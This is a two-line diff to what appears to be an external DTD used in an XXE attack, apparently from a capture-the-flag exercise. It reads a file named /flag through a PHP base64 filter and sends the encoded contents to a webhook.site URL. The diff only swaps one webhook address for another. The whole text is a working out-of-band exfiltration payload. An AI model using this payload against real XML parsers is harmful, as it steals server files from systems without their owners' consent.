@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'https://11894b02-898c-4551-a1ca-aae4f7912d3b.webhook.site/?d=%data;'>">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'https://webhook.site/0f43af07-33ec-4aa2-9b9a-98b8bf7619ab/?d=%data;'>">
